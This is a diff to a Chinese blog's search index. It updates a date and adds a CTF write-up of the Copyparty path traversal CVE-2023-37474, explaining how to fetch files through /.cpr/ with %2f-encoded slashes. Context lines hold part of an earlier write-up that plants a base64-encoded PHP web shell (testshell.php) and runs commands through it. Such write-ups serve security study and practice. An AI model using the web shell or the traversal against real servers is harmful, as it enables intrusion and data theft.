@@ -5,7 +5,7 @@
     <url>/2023/08/05/%E8%A6%81%E7%BD%AE%E9%A1%B6%E7%9A%84%E5%85%AC%E5%91%8A/</url>
     <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><html><head></head><body><h1 id="新朋友初次见面-老朋友好久不见-这里是猫涅"><a href="#新朋友初次见面-老朋友好久不见-这里是猫涅" class="headerlink" title="新朋友初次见面 老朋友好久不见 这里是猫涅"></a>新朋友初次见面 老朋友好久不见 这里是猫涅</h1><p><img data-src="/2023/08/05/%E8%A6%81%E7%BD%AE%E9%A1%B6%E7%9A%84%E5%85%AC%E5%91%8A/medium.png" alt="icon"></p>
 <h2 id="稍作声明"><a href="#稍作声明" class="headerlink" title="稍作声明"></a>稍作声明</h2><p>欢迎 这里是我的个人网页 博客 或者你认为的东西<br>学习相关的资料若有参考会表明具体出处 </p>
-<p>上次更新还是 <strong>2024/10/28</strong> 哦…<br>因为大学电脑环境原因 多半一周才会更新一次这期间的文章 见谅</p>
+<p>上次更新还是 <strong>2024/11/8</strong> 哦…<br>因为大学电脑环境原因 多半一周才会更新一次这期间的文章 见谅</p>
 </body></html>]]></content>
       <tags>
         <tag>告示</tag>
@@ -81,6 +81,11 @@ file_put_contents('testshell.php',base64_decode('PD9waHAgc3lzdGVtKCRfR0VUWzFdKTs
 ?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
 
 <p>修改完再次打包成zip 安装主题里弄上<br>安装完之后访问环境<code>/testshell.php?1= cat /flag</code>获取flag<br>完成！</p>
+<h2 id="CVE-2023-37474"><a href="#CVE-2023-37474" class="headerlink" title="CVE-2023-37474"></a>CVE-2023-37474</h2><blockquote>
+<p><em>靶标介绍：</em></p>
+<p>Copyparty是一个可移植的文件服务器。在1.8.2版本之前的版本存在一个CTF技巧，该漏洞位于<code>.cpr</code>子文件夹中。路径遍历攻击技术允许攻击者访问位于Web文档根目录之外的文件、目录.</p>
+</blockquote>
+<p>子目录也说了是.cpr 在网址后边输入/.cpr/（想要获取的文件名）<br>/符号用%2f代替即可 输入后便会自动下载相应的文件</p>
 <h1 id="结尾-引用"><a href="#结尾-引用" class="headerlink" title="结尾/引用"></a>结尾/引用</h1><blockquote>
 <p>We are just another visitor in a transient world.</p>
 </blockquote>
